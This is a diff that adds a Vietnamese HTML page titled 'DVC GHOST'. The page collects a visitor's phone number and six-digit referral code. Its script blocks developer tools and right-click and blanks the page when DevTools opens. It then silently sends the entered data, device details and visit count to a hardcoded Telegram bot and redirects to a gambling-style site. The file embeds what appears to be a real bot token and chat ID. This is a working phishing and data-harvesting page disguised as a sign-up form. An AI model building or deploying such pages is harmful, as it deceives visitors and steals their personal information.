@@ -1,0 +1,138 @@
+
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DVC GHOST</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f0f0f0;
+        }
+        #container {
+            padding: 40px;
+            border: 4px solid #ccc;
+            border-radius: 15px;
+            background-color: white;
+            backdrop-filter: blur(5px);  /* Optional, for a blurred background effect */
+            box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            background-image: url('https://i.imgur.com/cToZHNX.jpeg');
+            background-size: cover;
+            background-repeat: no-repeat;
+            background-position: center;
+        }
+        #container img {
+            max-width: 100px;
+            margin-bottom: 20px;
+        }
+        #phoneInput, #codeInput {
+            width: 100%;
+            padding: 10px 20px;
+            font-size: 20px;
+            border: 2px solid #ccc;
+            border-radius: 5px;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        #submitBtn {
+            width: 100%;
+            padding: 10px 20px;
+            font-size: 20px;
+            border: none;
+            border-radius: 5px;
+            background-color: #007BFF;
+            color: white;
+            cursor: pointer;
+        }
+    </style>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/sweetalert2@11/dist/sweetalert2.min.css">
+</head>
+<body>
+    <div id="container">
+        <img src="https://i.imgur.com/DGyNShG.png" alt="Logo">
+        <input type="text" id="phoneInput" maxlength="10" placeholder="Nhập số điện thoại">
+        <input type="text" id="codeInput" maxlength="6" placeholder="Nhập mã giới thiệu 6 số">
+        <button id="submitBtn">Xác Nhận</button>
+    </div>
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    <script>
+        // Chặn phím F12 (Mở Developer Tools)
+        document.addEventListener('keydown', function (event) {
+            if (event.key === 'F12') {
+                event.preventDefault();
+            }
+        });
+        // Chặn chuột phải
+        document.addEventListener('contextmenu', function (event) {
+            event.preventDefault();
+        });
+        // Chặn Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+Shift+C, Ctrl+U
+        document.addEventListener('keydown', function (event) {
+            if ((event.ctrlKey && event.shiftKey && (event.key === 'I' || event.key === 'J' || event.key === 'C')) || (event.ctrlKey && event.key === 'U')) {
+                event.preventDefault();
+            }
+        });
+        // Kiểm tra kích thước cửa sổ để phát hiện DevTools của Chrome
+        setInterval(function () {
+            if (window.outerWidth - window.innerWidth > 200 || window.outerHeight - window.innerHeight > 200) {
+                document.body.innerHTML = '<h1>Chế độ nhà phát triển không được hỗ trợ</h1>';
+            }
+        }, 1000);
+        document.getElementById('submitBtn').addEventListener('click', function () {
+            const phoneInput = document.getElementById('phoneInput').value;
+            const codeInput = document.getElementById('codeInput').value;
+            if (phoneInput.length === 10 && codeInput.length === 6) {
+                Swal.fire({
+                    icon: 'success',
+                    title: 'Đã xác nhận!',
+                    text: 'Vui Lòng Chờ Trong Giây Lát...',
+                    timer: 9000,
+                    timerProgressBar: true,
+                    willClose: () => {
+                        const deviceInfo = navigator.userAgent;
+                        const date = new Date().toLocaleString();
+                        let visitCount = localStorage.getItem('visitCount');
+                        if (visitCount) {
+                            visitCount = parseInt(visitCount) + 1;
+                        } else {
+                            visitCount = 1;
+                        }
+                        localStorage.setItem('visitCount', visitCount);
+                        const telegramToken = '7253954983:AAHacfwxChIsZkwswDYKCVVbroHkKQxanuo';  // Thay thế bằng token của bot
+                        const chatId = '-1002425365764';  // Thay thế bằng ID chat của bạn
+                        const message = `Số điện thoại: ${phoneInput}\nMã giới thiệu: ${codeInput}\nThiết bị truy cập: ${deviceInfo}\nNgày truy cập: ${date}\nSố lần truy cập: ${visitCount}`;
+                        const telegramUrl = `https://api.telegram.org/bot${telegramToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+                        // Gửi yêu cầu đến Telegram API
+                        fetch(telegramUrl).then(response => {
+                            if (response.ok) {
+                                window.location.href = 'https://Golden66.club';
+                            } else {
+                                Swal.fire({
+                                    icon: 'error',
+                                    title: 'Lỗi',
+                                    text: 'Không thể gửi thông tin. Vui lòng thử lại.'
+                                });
+                            }
+                        });
+                    }
+                });
+            } else {
+                Swal.fire({
+                    icon: 'error',
+                    title: 'Lỗi',
+                    text: 'Vui lòng nhập đầy đủ thông tin!',
+                    confirmButtonText: 'OK'
+                });
+            }
+        });
+    </script>
+</body>
+</html>
